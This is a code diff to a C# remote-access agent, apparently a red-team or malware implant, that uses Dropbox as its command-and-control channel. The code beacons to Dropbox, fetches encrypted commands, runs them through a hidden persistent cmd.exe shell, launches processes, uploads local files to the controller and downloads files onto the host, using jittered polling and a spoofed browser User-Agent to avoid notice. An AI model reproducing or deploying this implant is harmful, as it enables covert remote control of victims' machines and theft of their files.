@@ -21,6 +21,7 @@ using System.Web.Script.Serialization;
 using System.Net.NetworkInformation;
 using System.Security.Cryptography;
 using System.Threading;
+using System.Diagnostics;
 
 namespace dropboxc2
 {
@@ -29,7 +30,7 @@ namespace dropboxc2
     //****************************************************************************************
     static class Globals
     {
-        
+
     }
 
     //****************************************************************************************
@@ -51,12 +52,14 @@ namespace dropboxc2
         //--------------------------------------------------------------------------------------------------
         static void Main(string[] args)
         {
-            #if (DEBUG)
-                Console.WriteLine("------------ AGENT STARTING ------------");
-#endif
-
+#if (DEBUG)
+            Console.WriteLine("------------ AGENT STARTING ------------");
+            string accessToken = "INSERTTOKEN-he0";
+            byte[] cryptoKey = Convert.FromBase64String("INSERTBASE64==");
+#else
             string accessToken = args[0];
             byte[] cryptoKey = Convert.FromBase64String(args[1]);
+#endif
 
             // Create an instance of the C2_Agent
             C2_Agent c2_agent = new C2_Agent();
@@ -69,12 +72,24 @@ namespace dropboxc2
             c2_agent.c2StatusFile = "/" + c2_agent.agentID + ".status";
             c2_agent.c2CmdFile = "/" + c2_agent.agentID + ".cmd";
 
+            // Starting a shell for interactive use
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.UseShellExecute = false;
+            startInfo.RedirectStandardInput = true;
+            startInfo.RedirectStandardOutput = true;
+            startInfo.FileName = "cmd.exe";
+            startInfo.CreateNoWindow = true;
+
+            Process process = new Process();
+            process.StartInfo = startInfo;
+            process.Start();
+
             // Initializing a DropboxHandler object to handle all communications with the Dropbox C2 server
             DropboxHandler dropboxHandler = new DropboxHandler(accessToken);
 
-            #if (DEBUG)
-                    Console.WriteLine("[Main] Uploading status and command file to the C2 server");
-            #endif
+#if (DEBUG)
+            Console.WriteLine("[Main] Uploading status and command file to the C2 server");
+#endif
 
             // Create the c2StatusFile and c2CmdFile on the Dropbox server. These files act as an unique identifier for this agent
             // as well as a receiver for commands from the server
@@ -83,16 +98,17 @@ namespace dropboxc2
 
             if (c2_agent.c2StatusFileLastRevNumber == String.Empty || c2_agent.c2CmdFileLastRevNumber == String.Empty)
             {
-                #if (DEBUG)
-                    Console.WriteLine("[Main][ERROR] Cannot create files on the C2 server");
-                #endif
+#if (DEBUG)
+                Console.WriteLine("[Main][ERROR] Cannot create files on the C2 server");
+#endif
 
                 breakFlag = true;
             }
-            else {
-                #if (DEBUG)
-                    Console.WriteLine("[Main] C2 Files created - Agent ready");
-                #endif
+            else
+            {
+#if (DEBUG)
+                Console.WriteLine("[Main] C2 Files created - Agent ready");
+#endif
             }
 
             //---------------------------------------------------------------------------------
@@ -103,26 +119,26 @@ namespace dropboxc2
                 // Reset sleep time to the nominal polling period with a deviation
                 c2_agent.sleepTime = c2_agent.getRandomPeriod();
 
-                #if (DEBUG)
-                    Console.WriteLine("[Main loop] Going to sleep for " + c2_agent.sleepTime/1000 + " seconds");
-                #endif
+#if (DEBUG)
+                Console.WriteLine("[Main loop] Going to sleep for " + c2_agent.sleepTime / 1000 + " seconds");
+#endif
 
                 // Wait for the polling period to time out
                 Thread.Sleep(c2_agent.sleepTime);
-                #if (DEBUG)
-                    Console.WriteLine("[Main loop] Waking up");
-                #endif
+#if (DEBUG)
+                Console.WriteLine("[Main loop] Waking up");
+#endif
 
                 // At each cycle, 'touch' the status file to show the agent is alive = beaconing
                 c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes("READY - " + DateTime.Now.ToString()));
-   
+
                 // Check the c2 command File revision number
                 string revNumber = dropboxHandler.getRevNumber(c2_agent.c2CmdFile);
                 if (revNumber == String.Empty)
                 {
-                    #if (DEBUG)
-                        Console.WriteLine("[Main loop][ERROR] Unable to get the revision number for the command file");
-                    #endif
+#if (DEBUG)
+                    Console.WriteLine("[Main loop][ERROR] Unable to get the revision number for the command file");
+#endif
                     // There was an error retrieving the last revision number, skip this turn
                     continue;
                 }
@@ -130,9 +146,9 @@ namespace dropboxc2
                 // If the revision number is different, that means there's a new command to be treated
                 if (revNumber != c2_agent.c2CmdFileLastRevNumber)
                 {
-                    #if (DEBUG)
-                        Console.WriteLine("[Main loop] Command file has a new revision number: [" + revNumber + "]");
-                    #endif
+#if (DEBUG)
+                    Console.WriteLine("[Main loop] Command file has a new revision number: [" + revNumber + "]");
+#endif
 
                     c2_agent.c2CmdFileLastRevNumber = revNumber;
 
@@ -140,9 +156,9 @@ namespace dropboxc2
                     string content = Encoding.ASCII.GetString(Crypto.DecryptData(dropboxHandler.readFile(c2_agent.c2CmdFile), cryptoKey));
                     if (content == String.Empty)
                     {
-                        #if (DEBUG)
-                            Console.WriteLine("[Main loop][ERROR] C2 command file on the server seems empty...");
-                        #endif
+#if (DEBUG)
+                        Console.WriteLine("[Main loop][ERROR] C2 command file on the server seems empty...");
+#endif
                         continue;
                     }
 
@@ -154,53 +170,54 @@ namespace dropboxc2
                     string taskID = strReader.ReadLine();
                     string taskResultFile = "/" + c2_agent.agentID + "." + taskID;
 
-                    #if (DEBUG)
-                        Console.WriteLine("[Main loop] Command to execute: [" + command +"]");
-                    #endif
+#if (DEBUG)
+                    Console.WriteLine("[Main loop] Command to execute: [" + command + "]");
+#endif
 
                     switch (command)
                     {
                         case "runCLI":
                             string commandLine = strReader.ReadLine();
-                    
-                            #if (DEBUG)
-                                Console.WriteLine("\t[runCLI] Executing: [" + commandLine +"]");
-                            #endif
+
+#if (DEBUG)
+                            Console.WriteLine("\t[runCLI] Executing: [" + commandLine + "]");
+#endif
 
 
                             // Execute the command
-                            result = c2_agent.runCMD(commandLine);
+                            result = c2_agent.runCMD(commandLine, process);
 
                             if (result == null)
                             {
                                 result = "ERROR - COULD NOT EXECUTE COMMAND:" + commandLine;
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[runCLI][ERROR] External command did not executed properly");
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[runCLI][ERROR] External command did not executed properly");
+#endif
                             }
 
                             // Push the command result to the C2 server
                             dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.UTF8.GetBytes(result), cryptoKey));
-                        break;
+                            break;
 
                         case "launchProcess":
                             string exeName = strReader.ReadLine();
                             string arguments = strReader.ReadLine();
 
-                            #if (DEBUG)
-                                Console.WriteLine("\t[launchProcess] Executing: [" + exeName + " " + arguments + "]");
-                            #endif
+#if (DEBUG)
+                            Console.WriteLine("\t[launchProcess] Executing: [" + exeName + " " + arguments + "]");
+#endif
 
                             // Execute the command
                             if (c2_agent.launchProcess(exeName, arguments))
                             {
                                 result = "OK - PROCESS STARTED: " + exeName + arguments;
-                            } else
+                            }
+                            else
                             {
                                 result = "ERROR - COULD NOT EXECUTE: " + exeName + " " + arguments;
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[launchProcess][ERROR] External command did not executed properly");
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[launchProcess][ERROR] External command did not executed properly");
+#endif
                             }
 
                             // Push the command result to the C2 server
@@ -211,29 +228,30 @@ namespace dropboxc2
                             string localFile = strReader.ReadLine();
                             string remoteFile = taskResultFile + ".rsc";
 
-                            #if (DEBUG)
-                                Console.WriteLine("\t[sendFile] Uploading file [" + localFile + "] to [" + remoteFile + "]");
-                            #endif
+#if (DEBUG)
+                            Console.WriteLine("\t[sendFile] Uploading file [" + localFile + "] to [" + remoteFile + "]");
+#endif
 
                             if (File.Exists(localFile))
                             {
                                 // First push the wanted local file to the C2 server
                                 dropboxHandler.putFile(remoteFile, Crypto.EncryptData(File.ReadAllBytes(localFile), cryptoKey));
 
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[sendFile] File uploaded");
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[sendFile] File uploaded");
+#endif
 
                                 // The task result is the path to the uploaded resource file
                                 result = remoteFile;
-                                    
-                            } else
+
+                            }
+                            else
                             {
                                 // Push the command result to the C2 server
                                 result = "ERROR - FILE NOT FOUND: " + localFile;
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[sendFile][ERROR] Command did not executed properly. Localfile not found : [" + localFile + "]");
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[sendFile][ERROR] Command did not executed properly. Localfile not found : [" + localFile + "]");
+#endif
                             }
 
                             // Push the command result to the C2 server
@@ -250,21 +268,22 @@ namespace dropboxc2
                                 localPath = Path.GetTempPath();
                             }
 
-                            #if (DEBUG)
-                                Console.WriteLine("\t[downloadFile] Downloading file from [" + remoteFile + "] to [" + localPath + fileName + "]");
-                            #endif
+#if (DEBUG)
+                            Console.WriteLine("\t[downloadFile] Downloading file from [" + remoteFile + "] to [" + localPath + fileName + "]");
+#endif
 
                             if (dropboxHandler.downloadFile(remoteFile, localPath + fileName))
                             {
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[downloadFile] File downloaded");
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[downloadFile] File downloaded");
+#endif
                                 result = "OK - FILE DOWNLOADED AT: " + localPath + fileName;
-                            } else
+                            }
+                            else
                             {
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[downloadFile][ERROR] Could not download file");
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[downloadFile][ERROR] Could not download file");
+#endif
                                 result = "ERROR - COULD NOT WRITE FILE AT LOCATION: " + localPath + fileName;
                             }
 
@@ -280,22 +299,23 @@ namespace dropboxc2
                             string value = strReader.ReadLine();
                             if (Int32.TryParse(value, out sleepTime))
                             {
-                                c2_agent.sleepTime = sleepTime * 60*1000;
+                                c2_agent.sleepTime = sleepTime * 60 * 1000;
 
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[sleep] Going to sleep for " + sleepTime + " minute(s)");
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[sleep] Going to sleep for " + sleepTime + " minute(s)");
+#endif
 
                                 // Compute wake up time
                                 DateTime wakeUpTime = DateTime.Now.AddMinutes(sleepTime);
                                 result = "SLEEPING" + "," + wakeUpTime.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ");
 
                                 c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes(result));
-                            } else
+                            }
+                            else
                             {
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[sleep][ERROR] Invalid amount of time specified [" + value + "]");
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[sleep][ERROR] Invalid amount of time specified [" + value + "]");
+#endif
                                 result = "ERROR - INVALID AMOUNT OF TIME FOR SLEEP: " + value;
                             }
 
@@ -309,20 +329,20 @@ namespace dropboxc2
                             string value2 = strReader.ReadLine();
                             if (Int32.TryParse(value1, out period) && Int32.TryParse(value2, out deviation))
                             {
-                                c2_agent.pollingPeriod = period*1000;
+                                c2_agent.pollingPeriod = period * 1000;
                                 c2_agent.deviation = deviation;
 
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[polling] Polling period changed to {0}s with a deviation of {1}% ", period, deviation);
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[polling] Polling period changed to {0}s with a deviation of {1}% ", period, deviation);
+#endif
 
                                 result = "OK - PERIOD AND DEVIATION CHANGED";
                             }
                             else
                             {
-                                #if (DEBUG)
-                                    Console.WriteLine("\t[polling][ERROR] Invalid value for period or deviation [{0}] / [{1}] of {1}% ", value1, value2);
-                                #endif
+#if (DEBUG)
+                                Console.WriteLine("\t[polling][ERROR] Invalid value for period or deviation [{0}] / [{1}] of {1}% ", value1, value2);
+#endif
                                 result = "ERROR - INVALID INTEGER VALUE FOR PERIOD AND/OR DEVIATION: " + value1 + value2;
                             }
 
@@ -331,29 +351,30 @@ namespace dropboxc2
                             break;
 
                         case "stop":
-                            #if (DEBUG)
-                                    Console.WriteLine("\t[stop] Stopping agent");
-                                #endif
+#if (DEBUG)
+                            Console.WriteLine("\t[stop] Stopping agent");
+#endif
 
                             result = "OK - STOPPING";
                             // Push the command result to the C2 server
                             dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
-                            
-                             breakFlag = true;
+
+                            breakFlag = true;
                             break;
                     }
 
-                    
-                } else
+
+                }
+                else
                 {
-                    #if (DEBUG)
-                        Console.WriteLine("[Main loop] revNumber [" + revNumber + "] hasn't changed, nothing to treat");
-                    #endif
+#if (DEBUG)
+                    Console.WriteLine("[Main loop] revNumber [" + revNumber + "] hasn't changed, nothing to treat");
+#endif
                 }
             }
-            #if (DEBUG)
-                Console.WriteLine("[Main] Exiting... ");
-            #endif
+#if (DEBUG)
+            Console.WriteLine("[Main] Exiting... ");
+#endif
         }
 
         //--------------------------------------------------------------------------------------------------
@@ -362,57 +383,50 @@ namespace dropboxc2
         private int getRandomPeriod()
         {
             Random random = new Random((int)DateTime.Now.Ticks);
-            return random.Next(pollingPeriod - pollingPeriod*deviation/100, pollingPeriod + pollingPeriod*deviation/100); // Current sleep time, if agent is sleeping, this value increases
+            return random.Next(pollingPeriod - pollingPeriod * deviation / 100, pollingPeriod + pollingPeriod * deviation / 100); // Current sleep time, if agent is sleeping, this value increases
         }
 
         //--------------------------------------------------------------------------------------------------
         // This method runs an external command line on the sytem, using the windows interpreter (cmd.exe).
         // It returns the command result (output or error)
         //--------------------------------------------------------------------------------------------------
-        private string runCMD (string command)
+        private string runCMD(string command,System.Diagnostics.Process proc)
         {
             string result = null;
 
             try
             {
-                // create the ProcessStartInfo using "cmd" as the program to be run and "/c " as the parameters.
-                // Incidentally, /c tells cmd that we want it to execute the command that follows and then exit.
-                System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
-                
-                // Redirect both the standard output and the standard error stream
-                // This means that it will be redirected to the Process.StandardOutput StreamReader.
-                procStartInfo.RedirectStandardOutput = true;
-                procStartInfo.RedirectStandardError = true;
-                procStartInfo.UseShellExecute = false;
-                
-                // Run silently, do not create a console window
-                procStartInfo.CreateNoWindow = true;
-                
-                // Create a process, assign its ProcessStartInfo and start it
-                System.Diagnostics.Process proc = new System.Diagnostics.Process();
-                proc.StartInfo = procStartInfo;
-                proc.Start();
+
+                // Write the command to stdin
+                proc.StandardInput.WriteLine(command);
+                Console.WriteLine("sending command to CMD");
+
+		// Wait some time for completion
+                Thread.Sleep(1000);
 
                 // Get the output into a string
-                result = proc.StandardOutput.ReadToEnd();
-                proc.WaitForExit();
+                char[] cBuffer = null;
+                while (proc.StandardOutput.Peek() != -1)
+                {
+                    cBuffer = new char[5];
+                    proc.StandardOutput.Read(cBuffer, 0, cBuffer.Length);
+                    result += new string(cBuffer);
+                }
+                proc.StandardOutput.DiscardBufferedData();
 
-                // If there was an error, read the standard error stream
-                if (proc.ExitCode != 0) result += proc.StandardError.ReadToEnd();
-                
                 // Return the command output
                 return result;
             }
             catch (Exception ex)
             {
                 // Log the exception
-                #if (DEBUG)
-                    while (ex != null)
-                    {
-                        Console.WriteLine("[ERROR] " + ex.Message);                            
-                        ex = ex.InnerException;
-                    }
-                #endif
+#if (DEBUG)
+                while (ex != null)
+                {
+                    Console.WriteLine("[ERROR] " + ex.Message);
+                    ex = ex.InnerException;
+                }
+#endif
                 return result;
             }
         }
@@ -443,18 +457,18 @@ namespace dropboxc2
                 proc.StartInfo = procStartInfo;
                 proc.Start();
 
-                return true;             
+                return true;
             }
             catch (Exception ex)
             {
                 // Log the exception
-                #if (DEBUG)
-                    while (ex != null)
-                    {
-                        Console.WriteLine("[ERROR] " + ex.Message);                            
-                        ex = ex.InnerException;
-                    }
-                #endif
+#if (DEBUG)
+                while (ex != null)
+                {
+                    Console.WriteLine("[ERROR] " + ex.Message);
+                    ex = ex.InnerException;
+                }
+#endif
                 return false;
             }
         }
@@ -477,7 +491,7 @@ namespace dropboxc2
             foreach (ManagementObject mo in moc)
             {
                 if (cpuID == "")
-                {                
+                {
                     cpuID = mo.Properties["processorID"].Value.ToString();
                 }
             }
@@ -528,7 +542,7 @@ namespace dropboxc2
         //--------------------------------------------------------------------------------------------------
         // Constructor method
         //--------------------------------------------------------------------------------------------------
-        public DropboxHandler (string token)
+        public DropboxHandler(string token)
         {
             accessToken = token;
             authorizationHeader = "Bearer " + accessToken;
@@ -538,30 +552,30 @@ namespace dropboxc2
 
             //------------------------------------------------------------------
             // Check if an HTTP proxy is configured on the system, if so, use it
-            
+
             IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
             if (defaultProxy != null)
             {
                 defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                 webClient.Proxy = defaultProxy;
             }
-            
+
             // Set the Authorization header used for all API requests
             webClient.Headers.Add("Authorization", authorizationHeader);
-			
-			// Set the User-Agent header used for all API requests
-			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
+
+            // Set the User-Agent header used for all API requests
+            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
         }
 
         //--------------------------------------------------------------------------------------------------
         // Creates a file on the C2 server at the given path, containing the given bytes.
         // Returns the revision number for the file created.
         //--------------------------------------------------------------------------------------------------
-        public string putFile (string path, byte[] data)
+        public string putFile(string path, byte[] data)
         {
-            #if (DEBUG)
-                Console.WriteLine("\t\t[DropboxHandler.putFile] Uploading file...");
-            #endif
+#if (DEBUG)
+            Console.WriteLine("\t\t[DropboxHandler.putFile] Uploading file...");
+#endif
 
             string command = @"{""path"": """ + path + @""",""mode"": ""overwrite"",""autorename"": false,""mute"": true}";
             string revNumber = String.Empty;
@@ -579,19 +593,19 @@ namespace dropboxc2
             }
             catch (Exception ex)
             {
-                #if (DEBUG)
-                    while (ex != null)
-                    {
-                        Console.WriteLine("[ERROR] " + ex.Message);                            
-                        ex = ex.InnerException;
-                    }
-                #endif
+#if (DEBUG)
+                while (ex != null)
+                {
+                    Console.WriteLine("[ERROR] " + ex.Message);
+                    ex = ex.InnerException;
+                }
+#endif
                 return revNumber;
             }
 
-            #if (DEBUG)
-                Console.WriteLine("\t\t[DropboxHandler.putFile] File upload DONE");
-            #endif
+#if (DEBUG)
+            Console.WriteLine("\t\t[DropboxHandler.putFile] File upload DONE");
+#endif
             return revNumber;
         }
 
@@ -618,14 +632,14 @@ namespace dropboxc2
                 return revNumber;
             }
             catch (Exception ex)
+            {
+#if (DEBUG)
+                while (ex != null)
                 {
-                    #if (DEBUG)
-                    while (ex != null)
-                    {
-                        Console.WriteLine("[ERROR] " + ex.Message);                            
-                        ex = ex.InnerException;
-                    }
-                #endif
+                    Console.WriteLine("[ERROR] " + ex.Message);
+                    ex = ex.InnerException;
+                }
+#endif
                 return revNumber;
             }
         }
@@ -650,13 +664,13 @@ namespace dropboxc2
             }
             catch (Exception ex)
             {
-                #if (DEBUG)
-                    while (ex != null)
-                    {
-                        Console.WriteLine("[ERROR] " + ex.Message);                            
-                        ex = ex.InnerException;
-                    }
-                #endif
+#if (DEBUG)
+                while (ex != null)
+                {
+                    Console.WriteLine("[ERROR] " + ex.Message);
+                    ex = ex.InnerException;
+                }
+#endif
                 return false;
             }
         }
@@ -679,13 +693,13 @@ namespace dropboxc2
             }
             catch (Exception ex)
             {
-                #if (DEBUG)
-                    while (ex != null)
-                    {
-                        Console.WriteLine("[ERROR] " + ex.Message);                            
-                        ex = ex.InnerException;
-                    }
-                #endif
+#if (DEBUG)
+                while (ex != null)
+                {
+                    Console.WriteLine("[ERROR] " + ex.Message);
+                    ex = ex.InnerException;
+                }
+#endif
                 return response;
             }
         }
@@ -701,27 +715,27 @@ namespace dropboxc2
             webClient.Headers.Remove("Content-Type");
             webClient.Headers["Dropbox-API-Arg"] = command;
 
-            #if (DEBUG)
-                Console.WriteLine("\t\t[DropboxHandler.downloadFile] Downloading file...");
-            #endif
+#if (DEBUG)
+            Console.WriteLine("\t\t[DropboxHandler.downloadFile] Downloading file...");
+#endif
 
             try
             {
                 webClient.DownloadFile((string)dropboxAPI["downloadFile"], localFile);
-                #if (DEBUG)
-                    Console.WriteLine("\t\t[DropboxHandler.downloadFile] File downloaded");
-                #endif
+#if (DEBUG)
+                Console.WriteLine("\t\t[DropboxHandler.downloadFile] File downloaded");
+#endif
                 return true;
             }
             catch (Exception ex)
             {
-                #if (DEBUG)
-                    while (ex != null)
-                    {
-                        Console.WriteLine("[ERROR] " + ex.Message);                            
-                        ex = ex.InnerException;
-                    }
-                #endif
+#if (DEBUG)
+                while (ex != null)
+                {
+                    Console.WriteLine("[ERROR] " + ex.Message);
+                    ex = ex.InnerException;
+                }
+#endif
                 return false;
             }
         }
@@ -748,9 +762,9 @@ namespace dropboxc2
         //--------------------------------------------------------------------------------------------------
         static public byte[] EncryptData(byte[] plainMessage, byte[] key)
         {
-            #if (DEBUG)
-                Console.WriteLine("\t\t[Crypto.EncryptData] Encrypting data...");
-            #endif
+#if (DEBUG)
+            Console.WriteLine("\t\t[Crypto.EncryptData] Encrypting data...");
+#endif
 
             // Generate a random IV of 16 bytes
             RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider();
@@ -774,9 +788,9 @@ namespace dropboxc2
                         cs.Write(plainMessage, 0, plainMessage.Length);
                     }
 
-                    #if (DEBUG)
-                        Console.WriteLine("\t\t[Crypto.EncryptData] Data encrypted");
-                    #endif
+#if (DEBUG)
+                    Console.WriteLine("\t\t[Crypto.EncryptData] Data encrypted");
+#endif
                     return ms.ToArray();
                 }
             }
@@ -788,9 +802,9 @@ namespace dropboxc2
         //--------------------------------------------------------------------------------------------------
         static public byte[] DecryptData(byte[] cipher, byte[] key)
         {
-            #if (DEBUG)
-                Console.WriteLine("\t\t[Crypto.DecryptData] Decrypting data...");
-            #endif
+#if (DEBUG)
+            Console.WriteLine("\t\t[Crypto.DecryptData] Decrypting data...");
+#endif
 
             var IV = cipher.SubArray(0, 16);
             var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);
@@ -810,9 +824,9 @@ namespace dropboxc2
                         cs.Write(encryptedMessage, 0, encryptedMessage.Length);
                     }
 
-                    #if (DEBUG)
-                          Console.WriteLine("\t\t[Crypto.DecryptData] Data decrypted");
-                    #endif
+#if (DEBUG)
+                    Console.WriteLine("\t\t[Crypto.DecryptData] Data decrypted");
+#endif
 
                     return ms.ToArray();
                 }
